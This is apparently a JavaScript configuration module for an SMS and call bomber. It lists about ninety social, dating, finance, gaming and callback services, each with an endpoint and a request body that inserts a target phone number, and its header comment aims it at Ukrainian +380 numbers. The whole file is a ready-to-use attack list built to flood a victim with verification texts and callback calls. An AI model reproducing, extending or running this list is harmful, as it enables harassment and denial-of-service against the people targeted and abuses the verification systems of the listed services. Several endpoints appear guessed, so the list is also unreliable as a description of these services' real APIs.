// COMPREHENSIVE INTERNATIONAL + UKRAINIAN SMS/CALL SERVICES
// These services can send SMS or calls to +380 numbers

export const internationalServices = [
  // ===== SOCIAL NETWORKS =====
  { name: "Telegram", url: "https://my.telegram.org/auth/send_password", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "WhatsApp", url: "https://v.whatsapp.net/v2/code", method: "POST", body: '{"phone":"{phone}","method":"sms"}', contentType: "application/json" },
  { name: "Facebook", url: "https://m.facebook.com/ajax/login/help/identify.php", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Instagram", url: "https://i.instagram.com/api/v1/accounts/send_sms_code/", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "TikTok", url: "https://www.tiktok.com/passport/web/send_code/", method: "POST", body: '{"mobile":"{phone}","type":"register"}', contentType: "application/json" },
  { name: "Twitter/X", url: "https://api.twitter.com/1.1/onboarding/task.json", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "LinkedIn", url: "https://www.linkedin.com/checkpoint/rp/request-password-reset-submit", method: "POST", body: "phoneNumber={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Snapchat", url: "https://accounts.snapchat.com/accounts/send_sms_code", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "Discord", url: "https://discord.com/api/v9/auth/register/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Pinterest", url: "https://www.pinterest.com/resource/PhoneResource/update/", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "VK", url: "https://api.vk.com/method/auth.validatePhone", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },

  // ===== GOOGLE =====
  { name: "Google", url: "https://accounts.google.com/signin/v2/challenge/sk/presend", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "YouTube", url: "https://accounts.google.com/_/lookup/accountlookup", method: "POST", body: "phoneNumber=%2B{phone}", contentType: "application/x-www-form-urlencoded" },

  // ===== MICROSOFT =====
  { name: "Microsoft", url: "https://login.live.com/GetOneTimeCode.srf", method: "POST", body: "phoneNumber=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Outlook", url: "https://outlook.live.com/owa/auth/getotc", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Xbox", url: "https://login.live.com/ppsecure/inlineconnect.srf", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },

  // ===== DATING =====
  { name: "Tinder", url: "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "Badoo", url: "https://badoo.com/signin/phone/send_code/", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Bumble", url: "https://bumble.com/mwebapi.phtml", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "OkCupid", url: "https://www.okcupid.com/1/apitun/phone/send_code", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Hinge", url: "https://prod-api.hingeaws.net/auth/sms", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== E-COMMERCE =====
  { name: "Amazon", url: "https://www.amazon.com/ap/cvf/request", method: "POST", body: "phoneNumber=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "eBay", url: "https://signin.ebay.com/ws/eBayISAPI.dll", method: "POST", body: "MobilePhone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "AliExpress", url: "https://passport.aliexpress.com/newlogin/sms/send", method: "POST", body: '{"phoneNumber":"{phone}"}', contentType: "application/json" },
  { name: "Alibaba", url: "https://login.alibaba.com/newlogin/sms/send.do", method: "POST", body: "phoneNumber={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Wish", url: "https://www.wish.com/api/user/phone-number-login/send-code", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "Flipkart", url: "https://www.flipkart.com/api/5/user/otp/generate", method: "POST", body: '{"loginId":"+{phone}"}', contentType: "application/json" },

  // ===== RIDE SHARING =====
  { name: "Uber", url: "https://auth.uber.com/v2/submit", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Bolt", url: "https://node.bolt.eu/user/v1/phone/requestPhoneConfirmation", method: "POST", body: '{"phone":"{phoneLocal}","phone_prefix":"+380"}', contentType: "application/json" },
  { name: "Lyft", url: "https://api.lyft.com/v1/phone/send", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "Grab", url: "https://api.grab.com/auth/v1/otp/send", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "DiDi", url: "https://api.didiglobal.com/v1/auth/sms", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== DELIVERY =====
  { name: "Glovo", url: "https://api.glovoapp.com/v3/auth/token", method: "POST", body: '{"phoneNumber":"+{phone}","grantType":"phone_number"}', contentType: "application/json" },
  { name: "Deliveroo", url: "https://api.deliveroo.com/orderapp/v1/auth/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "DoorDash", url: "https://api.doordash.com/v2/auth/sms_login", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "UberEats", url: "https://auth.uber.com/v2/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Wolt", url: "https://restaurant-api.wolt.com/v1/auth/phone/request", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== FINANCE =====
  { name: "PayPal", url: "https://www.paypal.com/signin/client", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Wise", url: "https://wise.com/gateway/v3/verification/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Revolut", url: "https://api.revolut.com/auth/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Binance", url: "https://www.binance.com/bapi/accounts/v1/public/authcenter/sms/verify-code", method: "POST", body: '{"mobileCode":"380","mobile":"{phoneLocal}"}', contentType: "application/json" },
  { name: "Coinbase", url: "https://www.coinbase.com/api/v3/sms/send", method: "POST", body: '{"phone_number":"+{phone}"}', contentType: "application/json" },
  { name: "Crypto.com", url: "https://crypto.com/api/v1/auth/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "QIWI", url: "https://mobile-api.qiwi.com/oauth/authorize", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },

  // ===== GAMING =====
  { name: "Steam", url: "https://store.steampowered.com/phone/add_ajaxop", method: "POST", body: "phone=%2B{phone}&op=get_phone_number", contentType: "application/x-www-form-urlencoded" },
  { name: "Epic Games", url: "https://www.epicgames.com/id/api/sms/send", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Riot Games", url: "https://auth.riotgames.com/api/v1/phone/send", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Blizzard", url: "https://eu.account.blizzard.com/api/sms/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "PlayStation", url: "https://ca.account.sony.com/api/v1/ssocookie", method: "POST", body: "phoneNumber=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Xbox Live", url: "https://login.live.com/ppsecure/inlineconnect.srf", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },

  // ===== STREAMING =====
  { name: "Netflix", url: "https://www.netflix.com/api/shakti/mre/phonelookup", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Spotify", url: "https://www.spotify.com/api/signup/v1/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Disney+", url: "https://disney.api.edge.bamgrid.com/v1/public/sms", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "HBO Max", url: "https://oauth.api.hbo.com/auth/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Apple TV+", url: "https://appleid.apple.com/auth/verify/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "IVI", url: "https://api.ivi.ru/mobileapi/user/register/phone/v6/", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== CLOUD SERVICES =====
  { name: "iCloud", url: "https://appleid.apple.com/auth/verify/phone/put", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Dropbox", url: "https://www.dropbox.com/ajax_verify_phone_number", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Google Drive", url: "https://accounts.google.com/v3/signin/_/lookup", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "OneDrive", url: "https://login.live.com/GetOneTimeCode.srf", method: "POST", body: "phoneNumber={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Mail.ru Cloud", url: "https://cloud.mail.ru/api/v2/notify/applink", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== COMMUNICATION =====
  { name: "Skype", url: "https://login.skype.com/login/phone", method: "POST", body: "phoneNumber=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Zoom", url: "https://us04web.zoom.us/signin/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Slack", url: "https://slack.com/api/users.sendPhoneVerificationCode", method: "POST", body: "phone=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Teams", url: "https://login.microsoftonline.com/common/oauth2/v2.0/token", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "ICQ", url: "https://www.icq.com/smsreg/requestPhoneValidation.php", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== TRAVEL =====
  { name: "Booking.com", url: "https://www.booking.com/authentication/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Airbnb", url: "https://api.airbnb.com/v2/phone_verification/", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Expedia", url: "https://www.expedia.com/api/auth/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Hotels.com", url: "https://www.hotels.com/api/auth/phone/send", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Kayak", url: "https://www.kayak.com/mvm/auth/sms", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== ADULT (18+) =====
  { name: "Pornhub", url: "https://www.pornhub.com/user/phone_number/send_verification_code", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "OnlyFans", url: "https://onlyfans.com/api2/v2/users/register/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Chaturbate", url: "https://chaturbate.com/auth/phone_verify/", method: "POST", body: "phone=%2B{phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "LiveJasmin", url: "https://www.livejasmin.com/api/phone/send", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== CLASSIFIEDS/ADS =====
  { name: "Craigslist", url: "https://post.craigslist.org/c/sfo/phone", method: "POST", body: "phoneNumber={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Facebook Marketplace", url: "https://www.facebook.com/api/graphql/", method: "POST", body: '{"phone":"{phone}"}', contentType: "application/json" },
  { name: "eBay Kleinanzeigen", url: "https://www.ebay-kleinanzeigen.de/s-anzeige-aufgeben.html", method: "POST", body: "phone={phone}", contentType: "application/x-www-form-urlencoded" },
  { name: "Avito", url: "https://www.avito.ru/api/2/phone/verify/request", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Youla", url: "https://youla.ru/web-api/auth/request_code", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== FOOD/RESTAURANTS =====
  { name: "McDonald's", url: "https://www.mcdonalds.com/api/v3/auth/otp/request", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "KFC", url: "https://api.kfc.com/api/auth/phone/send", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },
  { name: "Starbucks", url: "https://app.starbucks.com/bff-api/auth/phone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },
  { name: "Domino's", url: "https://order.dominos.com/power/login/phone", method: "POST", body: '{"Phone":"+{phone}"}', contentType: "application/json" },
  { name: "Pizza Hut", url: "https://www.pizzahut.com/api/auth/phone", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json" },

  // ===== UTILITIES =====
  { name: "Signal", url: "https://textsecure-service.whispersystems.org/v1/verification/sms", method: "POST", body: '{"number":"+{phone}"}', contentType: "application/json" },
  { name: "ProtonMail", url: "https://api.protonmail.ch/sms/code", method: "POST", body: '{"Phone":"+{phone}"}', contentType: "application/json" },
  { name: "Tutanota", url: "https://mail.tutanota.com/rest/sys/verifyphone", method: "POST", body: '{"phoneNumber":"+{phone}"}', contentType: "application/json" },

  // ===== CALLBACK SERVICES (CALL) =====
  { name: "CallbackHunter", url: "https://callbackhunter.com/api/v1/callback", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json", type: "call" },
  { name: "Jivosite Callback", url: "https://node.jivosite.com/callback", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json", type: "call" },
  { name: "Calltouch", url: "https://api.calltouch.ru/calls-service/RestAPI/requests/orders/register", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json", type: "call" },
  { name: "Carrot Quest", url: "https://api.carrotquest.io/v1/conversations", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json", type: "call" },
  { name: "Mango Callback", url: "https://app.mango-office.ru/vpbx/callback/request", method: "POST", body: '{"phone":"+{phone}"}', contentType: "application/json", type: "call" },
];

export default internationalServices;
